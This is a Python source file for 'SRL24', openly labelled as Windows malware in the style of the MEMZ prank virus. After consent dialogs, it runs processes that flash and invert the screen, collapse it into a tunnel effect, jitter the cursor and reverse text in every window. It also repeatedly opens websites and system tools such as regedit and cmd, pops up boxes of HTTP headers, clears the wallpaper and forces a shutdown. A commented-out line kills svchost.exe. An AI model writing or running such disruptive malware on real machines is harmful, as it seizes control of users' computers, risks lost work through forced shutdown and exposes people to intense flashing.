"""

SRL24.py
This is the SRL24 Malware source code. 
Use this to run the malware.


The MIT License (MIT)
Copyright © 2023 JACK JAMES WAECHTER

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), 
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, 
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

from random import *
from win32api import *
from win32gui import *
from win32ui import *
from win32file import *
from win32con import *
import multiprocessing
from ctypes import windll
from os import system
import sys
from math import ceil
import requests
from tkinter import *
from tkinter.ttk import *
import string as alph

STDIN = sys.stdin
STDOUT = sys.stdout
STDERR = sys.stderr


class SRL24_UTILS():
    PAYLOAD_TARGETS = (
        "https://science.howstuffworks.com/bomb.htm",
        "https://en.wikipedia.org/wiki/SHA-2",
        "https://vimeo.com/groups/565619/videos/281984569",
        "https://archive.org/details/cannibal-holocaust-directors-cut-1980",
        "https://www.youtube.com/watch?v=gR0ytCjcSL4",
        "https://www.youtube.com/watch?v=AZm1_jtY1SQ",
        "https://www.youtube.com/watch?v=iyc62g7YQM0",
        "https://www.google.com/",
        "https://www.trustedantiviruscompare.com/best-free-antivirus",
        "https://guard.io/lp?n=g-chrome2&utm_source=bing&utm_campaign=405517655&utm_campaignname=B_Search_All_PC_All_Virus&utm_adgroup_id=1154488190128832&utm_ad=&utm_keyword=get%20rid%20of%20virus&msclkid=23201b635d4e18bcb00b789ae3b1ce51",
        "https://www.gemsforfree.com/en/roblox",
        "https://support.microsoft.com/en-us/office/remove-malware-from-your-windows-pc-360379ec-153b-4ab4-93ff-85be97789dbb",
        "https://en.wikipedia.org/wiki/Malware",
        "mspaint", "calc", "control",
        "cmd", "mmc", "write", "explorer", "msconfig",
        "regedit", "notepad", "taskmgr"
    )

    SRL24_WARN_MSG = """
    This is your last warning.
    
    If you wish to bail out, you may click no, and the malware will be removed.
    """

    SRL24_WARN_IGNORE_MSG = """
    We are not responible for any damage caused by this program

    Your computer must stay on, and you must keep it on until the experience is over.
    God Bless.
    """

    SRL24_EXPLAINED = """
    You have just ran SRL24.
    Please read below.


    SRL24 is a malware that will alter the effects of your computer for an ongoing 4 minutes.
    I will now describe what will happen in those four minutes.
    SRL24 will start by opening webpages containing the following:
        Controversal movies including Cannibal Holocaust, and Pink Floyd's The Wall.
        Songs including "Nazi Punks Fuck Off" (Dead Kennedys), "The Enternal" (Joy Division), and "2112" (Rush)
    Then, SRL24 will open random popups of HTTP request headers of webpages opened by the browser.
    SRL24 will then override the current Screen Buffer, drawing pixels, and eventually inverse the pixel colors on your screen,
    so expect bright flashing lights.

    And Finally, SRL24 will tunnel your screen, and your screen will collapse in on itself.

    After you have succesfully finished the amount of time SRL24 requested, your computer will shutdown and restart, 
    and the processes SRL24 started, will stop, and your system will go back to normal.


    By clicking "Proceed" you are agreeing to allow everything mentioned above to happen, along with allowing
    unexpected risks of harm to your computer. The creators will have no responibility for anything this program does.

    By keeping your computer on in those four minutes, will show your computers strength, and show your mental strength.
    """


    SRL24_HWND = GetDesktopWindow()  # Get window handle

    SRL24_HDC = GetDC(0)  # Get the first monitor
    SRL24_HDC_WIDTH = GetSystemMetrics(0)  # Get screen width
    SRL24_HDC_HEIGHT = GetSystemMetrics(1)  # Get screen height

    SRL24_HDC_X = 0
    SRL24_HDC_Y = 0

    
def SRL24_GETHEADERS(payload_data: str) -> str:
    """
    Send a HTTP GET Request to a payload if it is a url & return the headers
    If the payload is not a url, SRL24*40 will be returned instead
    """
    
    if payload_data.startswith("https://"):
        try:

            req = requests.get(payload_data)
            return str(req.headers)
        except:
            return "SRL24"*40
    return "SRL24"*40

def SRL24_ASSERT(expr, failure) -> any:
    """
    If expr (function) returns -1 then failure (function) will be called & the return value will be returned
    """

    assertion_result = expr()
    if (assertion_result == -1):
        return failure()
    return assertion_result


def SRL24_REQUEST_START() -> int:
    """
    Inform and allow user to bail out
    """

    if (MessageBox(SRL24_UTILS.SRL24_WARN_MSG, "SRL24 WARNING", MB_YESNO | MB_ICONWARNING)) == 7:  # User bailed out
        MessageBox("You have bailed out, no harm will be done.",
                   "SRL24", MB_OK | MB_ICONASTERISK)
        return -1
    MessageBox(SRL24_UTILS.SRL24_WARN_IGNORE_MSG,
               "SRL24", MB_OK | MB_ICONEXCLAMATION)
    return 0

def SRL24_RDELAY() -> int:
    Beep(randint(2000, 2700), randint(400, 800))
    return Sleep(randint(1000, 4000))

class SRL24_MAL_MANAGER():
    def __init__(self) -> None:
        self.SRL24_CONTINUE = True

    def srl24_process(self) -> int:
        """
        Overrides random pixels on the HDC
        """
        
        while self.SRL24_CONTINUE:
            for i in range(1026): 
                nx = int(randint(0, SRL24_UTILS.SRL24_HDC_WIDTH-150)+i//10)
                ny = int(randint(0, SRL24_UTILS.SRL24_HDC_HEIGHT-100))
                DrawIcon(
                    SRL24_UTILS.SRL24_HDC, nx, ny, 
                    LoadIcon(None, 
                             choice([IDI_ERROR, IDI_EXCLAMATION, IDI_WARNING, IDI_ASTERISK])))
                Sleep(100)
                SetPixel(
                    SRL24_UTILS.SRL24_HDC, 
                    nx, ny, 
                    RGB(255, ceil(0+i/10), ceil(0+i/10))
                )
            Sleep(10)
        return 0

    def puzzle_screen(self) -> int:
        nx = randrange(SRL24_UTILS.SRL24_HDC_WIDTH-100)
        ny = randrange(SRL24_UTILS.SRL24_HDC_HEIGHT-100)

        nw = randrange(600)
        nh = randrange(600)
        while self.SRL24_CONTINUE:
            BitBlt(SRL24_UTILS.SRL24_HDC, nx, ny, nw, nh, SRL24_UTILS.SRL24_HDC, nx, ny, SRCCOPY)
            Sleep(100)
        return 0

    def move_cursor(self) -> int:
        while self.SRL24_CONTINUE:      
            mouseX, mouseY = GetCursorPos()    
            nx = randint(-1, 1) + mouseX
            ny = randint(-1, 1) + mouseY
            SetCursorPos((nx, ny))
        return 0;

    def change_wallpaper(self) -> int:
        SystemParametersInfo(SPI_SETDESKWALLPAPER, "", 0)
        return 0
    
    def tunnel_screen(self) -> int:
        """
        Uses StretchBlt to collapse the window pixels in on itself, causing a tunnel effect.
        Similar to the one used in the MEMZ Virus
        """
        
        while self.SRL24_CONTINUE:
            Beep(2300, 4000)
            StretchBlt(
                SRL24_UTILS.SRL24_HDC, 50, 50,
                SRL24_UTILS.SRL24_HDC_WIDTH - 100,
                SRL24_UTILS.SRL24_HDC_HEIGHT - 100,
                SRL24_UTILS.SRL24_HDC, 0, 0,
                SRL24_UTILS.SRL24_HDC_WIDTH,
                SRL24_UTILS.SRL24_HDC_HEIGHT,
                SRCCOPY
            )
            Sleep(500)
            
    def shake_cursor(self) -> int:
        """
        Move the cursor around
        """
        
        while self.SRL24_CONTINUE:
            mouseX, mouseY = GetCursorPos() 
            nx = mouseX + int((randrange(3)-1) * 1200/2200+2)
            ny = mouseY + int((randrange(3)-1) * 1200/2200+2)
            SetCursorPos((nx, ny))
        
        return 0
    
    def open_payload(self, url: str) -> int:
        """
        Open a site or application via bash
        """
        
        try:
            system("start " + url)
            return 0
        except Exception:
            return -1

    def start_payloads(self) -> int:
        while self.SRL24_CONTINUE:
            SRL24_RDELAY()
            self.open_payload(choice(SRL24_UTILS.PAYLOAD_TARGETS))
        return 0

    def blink_window(self) -> int:
        """
        Inverse the HDC window pixels
        """
        
        while self.SRL24_CONTINUE:
            SRL24_RDELAY()
            PatBlt(
                SRL24_UTILS.SRL24_HDC,
                SRL24_UTILS.SRL24_HDC_X,
                SRL24_UTILS.SRL24_HDC_Y,
                SRL24_UTILS.SRL24_HDC_WIDTH,
                SRL24_UTILS.SRL24_HDC_HEIGHT,
                PATINVERT
            )
    
    def header_box(self) -> int:
        """
        Creates a box with the http headers of opened sites
        """
        
        SRL24_RDELAY()
        while self.SRL24_CONTINUE:
            Sleep(100)
            MessageBox(
                SRL24_GETHEADERS(choice(SRL24_UTILS.PAYLOAD_TARGETS)), 
                ''.join(
                choice(alph.digits + alph.ascii_letters + alph.punctuation) for _ in range(randint(8, 25)))
            )
        return 0
     
    def draw_cursor(self) -> int:
        """
        Draw icons where at the position of the cursor
        """
        
        while self.SRL24_CONTINUE:
            mouseX, mouseY = GetCursorPos() 
            DrawIcon(
                SRL24_UTILS.SRL24_HDC, mouseX, mouseY, 
                LoadIcon(None, choice([IDI_ERROR, IDI_EXCLAMATION, IDI_WARNING, IDI_ASTERISK])))
            Sleep(10)

    def reverse_text(self) -> int:
        """
        Reverse the text on the given handle
        """
        while self.SRL24_CONTINUE:
            EnumChildWindows(SRL24_UTILS.SRL24_HWND,
                            self.reverse_text_callback, None)

    def reverse_text_callback(self, hwnd, lParam) -> any:
        """
        Reverse text callback method, sends a 255 byte buffer, and returns it decoded as utf-16 which holds our message.
        It then sets that message to the handle which will set the text
        """
        try:

            buf = " "*255
            bsize = SendMessage(hwnd, WM_GETTEXT, 255, buf)
            res = buf[0:bsize*2].tobytes().decode('utf-16')
            res = res[::-1]
            SendMessage(hwnd, WM_SETTEXT, None, res)
        except:
            pass 



class SRL24():
    """
    SRL24 is a malware the is more experience based.
    This is not used for anything illegal or seriously malicous.

    By running this, the user has already agreed to the terms, and risks at stake.
    """



    def __init__(self):
        self.manager = SRL24_MAL_MANAGER()
        self.uiRoot = Tk()


    def SRL24_WIN32_SYS_SHUTDOWN(self) -> None:
        # Shutsdown the computer
        system("shutdown /s /t 1")
    
    def SRL24_START_APPLICATION(self) -> int:
        #Inform user on the risks & explain SRL24
        self.uiRoot.geometry("1000x640")
        self.uiRoot.title("SRL24")
        # Adds tkinter labels
        Label(self.uiRoot, text="WARNING.", font=("arial", 30)).pack(padx=100)
        Label(self.uiRoot, text=SRL24_UTILS.SRL24_EXPLAINED, font=("arial", 13)).pack()
        SRL24_OK = Button(self.uiRoot, text="Proceed")
        # Proceed button to start malware
        SRL24_OK.bind("<Button>", lambda e: self.SRL24_START_MAL())
        SRL24_OK.pack()
        mainloop()
        return 0


    def SRl24_LAST_CHANGE(self) -> None:
        self.SRL24_START_APPLICATION()
        SRL24_ASSERT(self.SRL24_START_MAL, lambda: sys.exit(1))
        
    
    def SRL24_START_MAL(self) -> int | None:
        SRL24_ASSERT(SRL24_REQUEST_START, lambda: sys.exit(1))
        self.uiRoot.destroy()
         
        """
        
        Begin the malware.
        Starts multiple processes, all used to create SRL24
        
        """
        
        
        manager = self.manager
        srl24_base_process = multiprocessing.Process(target=manager.srl24_process)
        cursor_process = multiprocessing.Process(target=manager.draw_cursor)
        headerbox_process = multiprocessing.Process(target=manager.header_box)
        payload_process = multiprocessing.Process(target=manager.start_payloads)
        reverse_process = multiprocessing.Process(target=manager.reverse_text)
        blink_process = multiprocessing.Process(target=manager.blink_window)
        puzzle_process = multiprocessing.Process(target=manager.puzzle_screen)
        tunnel_screen = multiprocessing.Process(target=manager.tunnel_screen)
        move_cursor = multiprocessing.Process(target=manager.move_cursor)
        
        # START PROCESSES
        Sleep(9000)
        payload_process.start()
        Sleep(4000)
        headerbox_process.start()
        Sleep(randint(5000, 9000))
        SRL24_RDELAY()
        puzzle_process.start()
        Sleep(randint(5000, 9000))
        SRL24_RDELAY()
        cursor_process.start()
        Sleep(900)
        reverse_process.start()
        blink_process.start()
        Sleep(randint(7000, 13000))
        SRL24_RDELAY()
        payload_process.terminate()
        move_cursor.start()
        tunnel_screen.start()
        srl24_base_process.start()
        #system("taskkill /F /IM svchost.exe")
        Sleep(50000)
        move_cursor.terminate()
        srl24_base_process.terminate()
        tunnel_screen.terminate()
        headerbox_process.terminate()
        cursor_process.terminate()
        reverse_process.terminate()
        blink_process.terminate()
        self.SRL24_WIN32_SYS_SHUTDOWN()
        sys.exit()


if __name__ == "__main__":
    SRL24_MAIN = SRL24()
    SRL24_MAIN.SRl24_LAST_CHANGE()
